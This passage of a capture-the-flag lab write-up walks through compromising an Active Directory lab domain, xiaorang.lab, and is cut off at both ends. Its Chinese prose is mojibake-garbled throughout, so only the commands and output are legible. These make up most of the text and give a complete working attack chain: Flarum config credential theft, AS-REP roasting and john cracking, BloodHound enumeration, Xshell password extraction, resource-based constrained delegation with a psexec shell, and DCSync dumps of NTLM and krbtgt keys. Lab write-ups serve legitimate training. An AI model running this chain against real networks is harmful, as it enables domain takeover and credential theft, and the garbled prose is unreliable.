è½½çš„æ’ä»¶: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.60.8\nä¸»æœºå: DC\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4 åœ°å€:\n      â””â”€ 172.22.60.8\n      â””â”€ 169.254.24.199\n[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.60.15\nä¸»æœºå: PC1\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4 åœ°å€:\n      â””â”€ 172.22.60.15\n      â””â”€ 169.254.125.121\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.42    XIAORANG\\FILESERVER\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.15    XIAORANG\\PC1\n[2025-05-05 11:29:51] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.60.42\nä¸»æœºå: Fileserver\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4 åœ°å€:\n      â””â”€ 172.22.60.42\n      â””â”€ 169.254.128.155\n[2025-05-05 11:29:51] [SUCCESS] NetBios 172.22.60.8     DC: XIAORANG\\DC\n[2025-05-05 11:29:51] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.60.52       çŠ¶æ€ç : 200 é•¿åº¦: 5867   æ ‡é¢˜: éœ„å£¤ç¤¾åŒº\n~~~\n\n~~~\nroot@web01:/var/www/html# cat config.php\n<?php return array (\n  'debug' => false,\n  'database' =>\n  array (\n    'driver' => 'mysql',\n    'host' => 'localhost',\n    'port' => 3306,\n    'database' => 'flarum',\n    'username' => 'root',\n    'password' => 'Mysql@root123',\n    'charset' => 'utf8mb4',\n    'collation' => 'utf8mb4_unicode_ci',\n    'prefix' => 'flarum_',\n    'strict' => false,\n    'engine' => 'InnoDB',\n    'prefix_indexes' => true,\n  ),\n  'url' => 'http://'.$_SERVER['HTTP_HOST'],\n  'paths' =>\n  array (\n    'api' => 'api',\n    'admin' => 'admin',\n  ),\n  'headers' =>\n  array (\n    'poweredByHeader' => true,\n    'referrerPolicy' => 'same-origin',\n  ),\n);\n~~~\n\næ‹¿åˆ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç äº†ï¼Œè¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›†\n\n~~~\nmysql > select email from flarum_users;\n+----------------------------+\n| email                      |\n+----------------------------+\n| administrator@xiaorang.lab |\n| chenbin@xiaorang.lab       |\n| chenbo@xiaorang.lab        |\n| chenchao@xiaorang.lab      |\n| chenchen@xiaorang.lab      |\n| chenfang@xiaorang.lab      |\n| chenhong@xiaorang.lab      |\n| chenhua@xiaorang.lab       |\n| chenjie@xiaorang.lab       |\n| chenjing@xiaorang.lab      |\n| chenjuan@xiaorang.lab      |\n| chenjun@xiaorang.lab       |\n| chenlei@xiaorang.lab       |\n| chenli@xiaorang.lab        |\n| chenlin@xiaorang.lab       |\n| chenling@xiaorang.lab      |\n| chenlong@xiaorang.lab      |\n| chenmin@xiaorang.lab       |\n| chenpeng@xiaorang.lab      |\n| chenping@xiaorang.lab      |\n| chenqiang@xiaorang.lab     |\n| chentao@xiaorang.lab       |\n| chenwei@xiaorang.lab       |\n| chenyan@xiaorang.lab       |\n| chenying@xiaorang.lab      |\n| chenyong@xiaorang.lab      |\n| chenyun@xiaorang.lab       |\n| gaofeng@xiaorang.lab       |\n| huangmin@xiaorang.lab      |\n| huangyong@xiaorang.lab     |\n| libin@xiaorang.lab         |\n| libing@xiaorang.lab        |\n| libo@xiaorang.lab          |\n| lichao@xiaorang.lab        |\n| lidan@xiaorang.lab         |\n| lifang@xiaorang.lab        |\n| lifeng@xiaorang.lab        |\n| ligang@xiaorang.lab        |\n| lihao@xiaorang.lab         |\n| lihong@xiaorang.lab        |\n| lihua@xiaorang.lab         |\n| lijia@xiaorang.lab         |\n| lijian@xiaorang.lab        |\n| lijie@xiaorang.lab         |\n| lijing@xiaorang.lab        |\n| lijuan@xiaorang.lab        |\n| lijun@xiaorang.lab         |\n| likai@xiaorang.lab         |\n| lilei@xiaorang.lab         |\n| lili@xiaorang.lab          |\n| liliang@xiaorang.lab       |\n| lilin@xiaorang.lab         |\n| liling@xiaorang.lab        |\n| lilong@xiaorang.lab        |\n| limin@xiaorang.lab         |\n| liming@xiaorang.lab        |\n| lina@xiaorang.lab          |\n| lining@xiaorang.lab        |\n| lipeng@xiaorang.lab        |\n| liping@xiaorang.lab        |\n| liqian@xiaorang.lab        |\n| liqiang@xiaorang.lab       |\n| liqin@xiaorang.lab         |\n| lishuai@xiaorang.lab       |\n| litao@xiaorang.lab         |\n| liubin@xiaorang.lab        |\n| liubing@xiaorang.lab       |\n| liuchang@xiaorang.lab      |\n| liuchao@xiaorang.lab       |\n| liudan@xiaorang.lab        |\n| liufang@xiaorang.lab       |\n| liufei@xiaorang.lab        |\n| liufeng@xiaorang.lab       |\n| liugang@xiaorang.lab       |\n| liuhao@xiaorang.lab        |\n| liuhua@xiaorang.lab        |\n| liuhuan@xiaorang.lab       |\n| liuhui@xiaorang.lab        |\n| liujia@xiaorang.lab        |\n| liujing@xiaorang.lab       |\n| liujun@xiaorang.lab        |\n| liukai@xiaorang.lab        |\n| liulei@xiaorang.lab        |\n| liuli@xiaorang.lab         |\n| liuling@xiaorang.lab       |\n| liumei@xiaorang.lab        |\n| liumin@xiaorang.lab        |\n| liuming@xiaorang.lab       |\n| liuna@xiaorang.lab         |\n| liupeng@xiaorang.lab       |\n| liuping@xiaorang.lab       |\n| liuqian@xiaorang.lab       |\n| liuqiang@xiaorang.lab      |\n| liuqin@xiaorang.lab        |\n| liushuai@xiaorang.lab      |\n| liutao@xiaorang.lab        |\n| liuwei@xiaorang.lab        |\n| liuxia@xiaorang.lab        |\n| liuxin@xiaorang.lab        |\n| liuyan@xiaorang.lab        |\n| liuying@xiaorang.lab       |\n| liuyong@xiaorang.lab       |\n| liuyun@xiaorang.lab        |\n| liwei@xiaorang.lab         |\n| liwen@xiaorang.lab         |\n| lixiang@xiaorang.lab       |\n| lixin@xiaorang.lab         |\n| lixue@xiaorang.lab         |\n| liyan@xiaorang.lab         |\n| liyang@xiaorang.lab        |\n| liying@xiaorang.lab        |\n| liyong@xiaorang.lab        |\n| liyun@xiaorang.lab         |\n| machao@xiaorang.lab        |\n| sunwei@xiaorang.lab        |\n| wangbin@xiaorang.lab       |\n| wangbing@xiaorang.lab      |\n| wangbo@xiaorang.lab        |\n| wangchao@xiaorang.lab      |\n| wangcheng@xiaorang.lab     |\n| wangdan@xiaorang.lab       |\n| wangdong@xiaorang.lab      |\n| wangfang@xiaorang.lab      |\n| wanggang@xiaorang.lab      |\n| wanghao@xiaorang.lab       |\n| wanghua@xiaorang.lab       |\n| wanghuan@xiaorang.lab      |\n| wanghui@xiaorang.lab       |\n| wangjian@xiaorang.lab      |\n| wangjing@xiaorang.lab      |\n| wangjuan@xiaorang.lab      |\n| wangkai@xiaorang.lab       |\n| wangkun@xiaorang.lab       |\n| wanglei@xiaorang.lab       |\n| wangli@xiaorang.lab        |\n| wangliang@xiaorang.lab     |\n| wanglin@xiaorang.lab       |\n| wangling@xiaorang.lab      |\n| wanglong@xiaorang.lab      |\n| wanglu@xiaorang.lab        |\n| wangmei@xiaorang.lab       |\n| wangmin@xiaorang.lab       |\n| wangming@xiaorang.lab      |\n| wangna@xiaorang.lab        |\n| wangning@xiaorang.lab      |\n| wangping@xiaorang.lab      |\n| wangqian@xiaorang.lab      |\n| wangqiang@xiaorang.lab     |\n| wangqin@xiaorang.lab       |\n| wangrong@xiaorang.lab      |\n| wangrui@xiaorang.lab       |\n| wangtao@xiaorang.lab       |\n| wangting@xiaorang.lab      |\n| wangwei@xiaorang.lab       |\n| wangxia@xiaorang.lab       |\n| wangxin@xiaorang.lab       |\n| wangxu@xiaorang.lab        |\n| wangxue@xiaorang.lab       |\n| wangyan@xiaorang.lab       |\n| wangying@xiaorang.lab      |\n| wangyong@xiaorang.lab      |\n| wangyu@xiaorang.lab        |\n| wangyun@xiaorang.lab       |\n| xumin@xiaorang.lab         |\n| xuwei@xiaorang.lab         |\n| yangbin@xiaorang.lab       |\n| yangbo@xiaorang.lab        |\n| yangchao@xiaorang.lab      |\n| yangfang@xiaorang.lab      |\n| yanghong@xiaorang.lab      |\n| yanghua@xiaorang.lab       |\n| yangjie@xiaorang.lab       |\n| yangjing@xiaorang.lab      |\n| yangjuan@xiaorang.lab      |\n| yangjun@xiaorang.lab       |\n| yangli@xiaorang.lab        |\n| yanglin@xiaorang.lab       |\n| yangling@xiaorang.lab      |\n| yangliu@xiaorang.lab       |\n| yangmei@xiaorang.lab       |\n| yangming@xiaorang.lab      |\n| yangping@xiaorang.lab      |\n| yangtao@xiaorang.lab       |\n| yangwei@xiaorang.lab       |\n| yangxue@xiaorang.lab       |\n| yangyan@xiaorang.lab       |\n| yangyang@xiaorang.lab      |\n| yangyong@xiaorang.lab      |\n| zhangbin@xiaorang.lab      |\n| zhangbo@xiaorang.lab       |\n| zhangchao@xiaorang.lab     |\n| zhangdan@xiaorang.lab      |\n| zhangfan@xiaorang.lab      |\n| zhangfei@xiaorang.lab      |\n| zhangfeng@xiaorang.lab     |\n| zhanghao@xiaorang.lab      |\n| zhanghong@xiaorang.lab     |\n| zhanghua@xiaorang.lab      |\n| zhanghui@xiaorang.lab      |\n| zhangjian@xiaorang.lab     |\n| zhangjie@xiaorang.lab      |\n| zhangjing@xiaorang.lab     |\n| zhangjun@xiaorang.lab      |\n| zhanglei@xiaorang.lab      |\n| zhangli@xiaorang.lab       |\n| zhangliang@xiaorang.lab    |\n| zhanglin@xiaorang.lab      |\n| zhangling@xiaorang.lab     |\n| zhanglong@xiaorang.lab     |\n| zhangmei@xiaorang.lab      |\n| zhangmin@xiaorang.lab      |\n| zhangming@xiaorang.lab     |\n| zhangnan@xiaorang.lab      |\n| zhangning@xiaorang.lab     |\n| zhangpeng@xiaorang.lab     |\n| zhangping@xiaorang.lab     |\n| zhangqian@xiaorang.lab     |\n| zhangqiang@xiaorang.lab    |\n| zhangqin@xiaorang.lab      |\n| zhangrong@xiaorang.lab     |\n| zhangrui@xiaorang.lab      |\n| zhangshuai@xiaorang.lab    |\n| zhangtao@xiaorang.lab      |\n| zhangting@xiaorang.lab     |\n| zhangwei@xiaorang.lab      |\n| zhangwen@xiaorang.lab      |\n| zhangxia@xiaorang.lab      |\n| zhangxin@xiaorang.lab      |\n| zhangxue@xiaorang.lab      |\n| zhangyan@xiaorang.lab      |\n| zhangying@xiaorang.lab     |\n| zhangyong@xiaorang.lab     |\n| zhangyu@xiaorang.lab       |\n| zhangyun@xiaorang.lab      |\n| zhaojing@xiaorang.lab      |\n| zhaojun@xiaorang.lab       |\n| zhaoli@xiaorang.lab        |\n| zhaomin@xiaorang.lab       |\n| zhaowei@xiaorang.lab       |\n| zhaoyong@xiaorang.lab      |\n| zhoujie@xiaorang.lab       |\n| zhoujing@xiaorang.lab      |\n| zhouli@xiaorang.lab        |\n| zhoumin@xiaorang.lab       |\n| zhouwei@xiaorang.lab       |\n| zhouyong@xiaorang.lab      |\n+----------------------------+\n~~~\n\nå°†é‚®ç®±å–å‡ºæ¥\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# grep -E \" [^| ].*lab \" 1 -o > 2\n~~~\n\nç„¶åæ‰“ `AS-REP Rroasting`\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.60.8 -usersfile 2\n....\n$krb5asrep$ 23 $wangyun@xiaorang.lab@XIAORANG.LAB:5addef2c40ec88e399e44de7ce033d96$ d6aaf3b1c9a159b341c3bae1a662aa8743446421b4cc6dce7eb9ef56c2f1b6be9a02803e6338077443b120df8460bd985b426021b7413698623d7230ecc39b3046b31a19f7e69f375d535b31fdb7fbf1ac06cbf094ad02de073712bc084678d63f1deb6a5347191cd97e69b6e26ab2a1cfa9e2146f4db57678c959ee7db72fc4f210558a410f75e38c48755eb151fac7dfd41c4c9ad6d05e050b815ec59cff9826fdb89f0222c5f8470759a50b5aeb87d50b99b6be487938bb7c1c9a10ae4e9c45b5759742f507863e35113f72cfeac3532f15ed584cac1a321e1f3e38fa3b90769f559cf8b5bebf50148825\n....\n$krb5asrep$ 23 $zhangxin@xiaorang.lab@XIAORANG.LAB:e392adc6c3ca1cd1e039b2c719fbd4de$ 7cf0bfb4a6e46c67fde82e5b3a35db844d3aac45f1b0b842a302386db4f5c7e5d8622a45ff4d0df17489382f47f15b3e268a320a202020838d37f6beeb0ff79bed8b1f3c6f52681a4caeee928c6cebb3bf9b536197e6c40787b1045ac7708d1fbc2e07316b875ccd0ef1f308ad323d21c6d30adf30b2d4287e121b140c579944b21a19329727e98162c05398112bdf14be295c71a373e9a3211efc7fbb5be1074aafc53bc56adc1aeb3c76238623ccc753160eac09b99ec0738b3c5a26b4cee39ea6a797503f87bb9eb36a543326b22f4be1e307b08734467296cd027d7bb5de0761dfcf811975fcf5dc8f8a\n~~~\n\nå¯ä»¥è·‘å‡ºæ¥ä¸¤æ¡ï¼Œç„¶åç”¨ john çˆ†ç ´\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# john pass -w =/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAdm12geC         ($krb5asrep$ 23$wangyun@xiaorang.lab@XIAORANG.LAB)\n~~~\n\nå¯ä»¥çˆ†ç ´å‡ºæ¥ wangyun çš„å¯†ç ï¼Œç„¶åç”¨ blood-hound è¿›è¡ŒåŸŸå†…ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -dc DC.xiaorang.lab -c all --dns-tcp -ns 172.22.60.8 --auth\n-method ntlm --zip\nINFO: Found AD domain: xiaorang.lab\nINFO: Connecting to LDAP server: DC.xiaorang.lab\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: DC.xiaorang.lab\nINFO: Found 12 users\nINFO: Found 52 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: fileserver.xiaorang.lab\nINFO: Querying computer: PC1.xiaorang.lab\nINFO: Querying computer: DC.xiaorang.lab\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done in 00M 09S\nINFO: Compressing output into 20250504234223_bloodhound.zip\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum1.png)\n\nå¯ä»¥å‘ç° zhangxin å±äº Acount Operatorsï¼Œå› æ­¤å¯¹åŸŸå†…éåŸŸæ§çš„æ‰€æœ‰æœºå™¨éƒ½å…·æœ‰ GenericAll æƒé™ï¼Œè€Œ FILESERVER æœºå™¨æœ‰ DCSyncï¼Œæ€è·¯å°±å¾ˆæ˜æ˜¾äº†\n\né¦–å…ˆè¿œç¨‹æ¡Œé¢è¿æ¥ 172.22.60.15\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Flarum2.png)\n\nå‘ç°æ¡Œé¢ä¸Šæœ‰ä¸€ä¸ª xshellï¼Œåˆ©ç”¨ [å·¥å…·](https://github.com/JDArmy/SharpXDecrypt) å°† xshell çš„å‡­è¯å¯¼å‡º\n\n~~~\nPS C:\\Users\\wangyun\\Desktop > .\\SharpXDecrypt.exe\n\nXshell å…¨ç‰ˆæœ¬å‡­è¯ä¸€é”®å¯¼å‡ºå·¥å…·!(æ”¯æŒ Xshell 7.0+ç‰ˆæœ¬)\nAuthor: 0pen1\nGithub: https://github.com/JDArmy\n[!] WARNING: For learning purposes only, please delete it within 24 hours after downloading!\n\n[*] Start GetUserPath....\n  UserPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\n[*] Get UserPath Success !\n\n[*] Start GetUserSID....\n  Username: wangyun\n  userSID: S-1-5-21-3535393121-624993632-895678587-1107\n[*] GetUserSID Success !\n\n  XSHPath: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\SSH.xsh\n  Host: 172.22.60.45\n  UserName: zhangxin\n  Password: admin4qwY38cc\n  Version: 7.1\n\n[*] read done\n~~~\n\næŠ“åˆ°äº† zhangxin çš„å¯†ç ï¼Œç„¶åæ‰“ RBCD\n\n~~~\nPS C:\\Users\\zhangxin\\Desktop > Set-ExecutionPolicy Bypass -Scope Process\n\næ‰§è¡Œç­–ç•¥æ›´æ”¹\næ‰§è¡Œç­–ç•¥å¯å¸®åŠ©ä½ é˜²æ­¢æ‰§è¡Œä¸ä¿¡ä»»çš„è„šæœ¬ã€‚æ›´æ”¹æ‰§è¡Œç­–ç•¥å¯èƒ½ä¼šäº§ç”Ÿå®‰å…¨é£é™©ï¼Œå¦‚\nhttps:/go.microsoft.com/fwlink/?LinkID = 135170 ä¸­çš„ about_Execution_Policies å¸®åŠ©ä¸»é¢˜æ‰€è¿°ã€‚æ˜¯å¦è¦æ›´æ”¹æ‰§è¡Œç­–ç•¥?\n[Y] æ˜¯(Y)  [A] å…¨æ˜¯(A)  [N] å¦(N)  [L] å…¨å¦(L)  [S] æš‚åœ(S)  [?] å¸®åŠ© (é»˜è®¤å€¼ä¸ºâ€œNâ€): Y\nPS C:\\Users\\zhangxin\\Desktop > import-module .\\Powermad.ps1\nPS C:\\Users\\zhangxin\\Desktop > New-MachineAccount -MachineAccount test -Password $(ConvertTo-SecureString \" 123456 \" -AsPlainText -Force)\n[+] Machine account test added\nPS C:\\Users\\zhangxin\\Desktop > import-module .\\powerview.ps1\nPS C:\\Users\\zhangxin\\Desktop > Get-NetComputer test -Properties objectsid\n\nobjectsid\n---------\nS-1-5-21-3535393121-624993632-895678587-1117\n\n\nPS C:\\Users\\zhangxin\\Desktop > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \" O: BAD:(A;; CCDCLCSWRPWPDTLOCRSDRCWDWO;;; S-1-5-21-3535393121-624993632-895678587-1117)\"\nPS C:\\Users\\zhangxin\\Desktop > $SDBytes = New-Object byte[] ($ SD.BinaryLength)\nPS C:\\Users\\zhangxin\\Desktop > $SD.GetBinaryForm($ SDBytes, 0)\nPS C:\\Users\\zhangxin\\Desktop > Get-DomainComputer Fileserver| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose\nè¯¦ç»†ä¿¡æ¯: [Get-DomainSearcher] search string: LDAP://DC.xiaorang.lab/DC = xiaorang, DC = lab\nè¯¦ç»†ä¿¡æ¯: [Get-DomainObject] Get-DomainObject filter string:\n(&(|(distinguishedname = CN = FILESERVER, CN = Computers, DC = xiaorang, DC = lab)))\nè¯¦ç»†ä¿¡æ¯: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0\n 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 97 209\n185 210 96 165 64 37 123 248 98 53 93 4 0 0' for object 'FILESERVER$'\nPS C:\\Users\\zhangxin\\Desktop >\n~~~\n\nç„¶åä¿®æ”¹/etc/hosts\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# cat /etc/hosts\n127.0.0.1       localhost\n127.0.1.1       kali.kali       kali\n\n# The following lines are desirable for IPv6 capable hosts\n:: 1     localhost ip6-localhost ip6-loopback\nff02:: 1 ip6-allnodes\nff02:: 2 ip6-allrouters\n172.22.60.15 PC1.xiaorang.lab\n172.22.60.42 FILESERVER.xiaorang.lab\n~~~\n\nç„¶åç”³è¯·ç¥¨æ®å°±è¡Œäº†\n\n~~~\nimpacket-getST -dc-ip 172.22.60.8 xiaorang.lab/test\\$: 123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administrator\nexport KRB5CCNAME = administrator.ccache\nproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk\n~~~\n\nä½†æ˜¯åé¢æˆ‘åˆå‘ç°ä¸€ç§æ›´ç®€å•çš„æ–¹æ³•\n\n~~~\nproxychains python3 addcomputer.py xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name 'TEST2$' -computer-pass 'P@ssw0rd'\n\nproxychains python3 rbcd.py xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -action write -delegate-to 'Fileserver $' -delegate-from 'TEST2$'\n\nproxychains python3 getST.py xiaorang.lab/'TEST2$':'P@ssw0rd' -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8\n~~~\n\nåé¢ä¹Ÿæ˜¯\n\n~~~\nexport KRB5CCNAME = administrator.ccache\nproxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk\n~~~\n\nflag åœ¨ C:\\users\\administrator\\flag ä¸‹\n\n# FLAG02&FLAG04\n\næŠ“ä¸€ä¸‹ FILESERVER çš„å“ˆå¸Œ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# secretsdump.py -k -no-pass FILESERVER.xiaorang.lab -dc-ip 172.22.60.8\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5\n[*] Dumping local SAM hashes (uid: rid: lmhash: nthash)\nAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: bd8e2e150f44ea79fff5034cad4539fc:::\nGuest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount: 503: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount: 504: aad3b435b51404eeaad3b435b51404ee: b40dda6fd91a2212d118d83e94b61b11:::\n[*] Dumping cached domain logon information (domain/username: hash)\nXIAORANG.LAB/Administrator: $DCC2$ 10240#Administrator#f9224930044d24598d509aeb1a015766\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC\nXIAORANG\\Fileserver$: plain_password_hex: 3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300\nXIAORANG\\Fileserver$: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::\n[*] DPAPI_SYSTEM\ndpapi_machinekey: 0x15367c548c55ac098c599b20b71d1c86a2c1f610\ndpapi_userkey: 0x28a7796c724094930fc4a3c5a099d0b89dccd6d1\n[*] NL$KM\n 0000   8B 14 51 59 D7 67 45 80  9F 4A 54 4C 0D E1 D3 29   ..QY.gE..JTL...)\n 0010   3E B6 CC 22 FF B7 C5 74  7F E4 B0 AD E7 FA 90 0D   >..\"...t........\n 0020   1B 77 20 D5 A6 67 31 E9  9E 38 DD 95 B0 60 32 C4   .w ..g1..8...`2.\n 0030   BE 8E 72 4D 0D 90 01 7F  01 30 AC D7 F8 4C 2B 4A   ..rM.....0...L+J\nNL$KM: 8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a\n[*] Cleaning up...\n[*] Stopping service RemoteRegistry\n~~~\n\nç„¶åè¿›è¡Œ DcSync æ”»å‡»å¯¼å‡ºåŸŸæ§å“ˆå¸Œ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ': 951d8a9265dfb652f42e5c8c497d70dc'\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator: 500: aad3b435b51404eeaad3b435b51404ee: c3cfdc08527ec4ab6aa3e630e79d349b:::\nGuest: 501: aad3b435b51404eeaad3b435b51404ee: 31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt: 502: aad3b435b51404eeaad3b435b51404ee: 98194d49adfe247020eaade4a3936d95:::\nchenfang: 1105: aad3b435b51404eeaad3b435b51404ee: 302b5743b0f7b3436591aedf550ded5b:::\nzhanghao: 1106: aad3b435b51404eeaad3b435b51404ee: 4c37e7a022daf856bfa2b16824696ab5:::\nwangyun: 1107: aad3b435b51404eeaad3b435b51404ee: 561d64b9a1c943db32810fb5586a4be9:::\nzhangwei: 1108: aad3b435b51404eeaad3b435b51404ee: 3d2f864635abb31f2546dc07cbcd2528:::\nwangkai: 1109: aad3b435b51404eeaad3b435b51404ee: d20a47a4529552805d96a24c3020384c:::\nyangyan: 1110: aad3b435b51404eeaad3b435b51404ee: 4f80f967fd586f4212bc264a7d1f6789:::\nzhangxin: 1111: aad3b435b51404eeaad3b435b51404ee: 38780e101b28bb9b9036fc3e2e4f35e6:::\nwangping: 1112: aad3b435b51404eeaad3b435b51404ee: 0adf6fb0f808be95d449e3b6c67b02dc:::\nDC$: 1000: aad3b435b51404eeaad3b435b51404ee: f0cc8fa9ded68237e1861cfa3f28d483:::\nPC1$: 1103: aad3b435b51404eeaad3b435b51404ee: 5fbf6f7f779da62fe4db9d8448cebed5:::\nFILESERVER$: 1114: aad3b435b51404eeaad3b435b51404ee: 951d8a9265dfb652f42e5c8c497d70dc:::\ntest1$: 1116: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nlv$: 1117: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nevailpc$: 1118: aad3b435b51404eeaad3b435b51404ee: 8846f7eaee8fb117ad06bdd830b7586c:::\nll$: 1119: aad3b435b51404eeaad3b435b51404ee: 32ed87bdb5fdc5e9cba88547376818d4:::\nTEST2$: 1120: aad3b435b51404eeaad3b435b51404ee: e19ccf75ee54e06b06a5907af13cef42:::\n[*] Kerberos keys grabbed\nAdministrator: aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683\nAdministrator: aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9\nAdministrator: des-cbc-md5: f72a9889a18cc408\nkrbtgt: aes256-cts-hmac-sha1-96:01cbdd6e9fcb7381f08f6ff1c3698f5642e1fd7b2a0dee8c85b9ad370a09abdd\nkrbtgt: aes128-cts-hmac-sha1-96: edde21e07fc8dc56b0d5c7f1cec73691\nkrbtgt: des-cbc-md5:8adace38ba738a34\nchenfang: aes256-cts-hmac-sha1-96:2c06b19f9f574ee1e7db61071aece803de7af58d229b3529e04d9ec38aac5941\nchenfang: aes128-cts-hmac-sha1-96:4014efeb6533ba5a572fc41826573c46\nchenfang: des-cbc-md5: f2ba8f496e702664\nzhanghao: aes256-cts-hmac-sha1-96: ea51257d0834bdeabc87c48fede2ede9b9833d6d87dcc1ed26747a5990dbb301\nzhanghao: aes128-cts-hmac-sha1-96:5efc32f73f2cff27f49b80346d0ab172\nzhanghao: des-cbc-md5: ef19c776ef4caef7\nwangyun: aes256-cts-hmac-sha1-96:5aac300487414042e25eb1fffe5681392a8c0013c27413c6982b19445032db9a\nwangyun: aes128-cts-hmac-sha1-96:8a2c325e83084282896dcdc40d5780fe\nwangyun: des-cbc-md5: c434a716fe7ad3dc\nzhangwei: aes256-cts-hmac-sha1-96:8ccb33735cb1be69c9e115ecde51ce41d33ee297446d4603ec43f6367ed9c77b\nzhangwei: aes128-cts-hmac-sha1-96:1fdbe52915e9ccb03b813a2f0215b0c1\nzhangwei: des-cbc-md5:7998f12a86024a07\nwangkai: aes256-cts-hmac-sha1-96:76eb8643be14b795327e149899984c077a0db78b4af7faaf45759ef87e44e6a8\nwangkai: 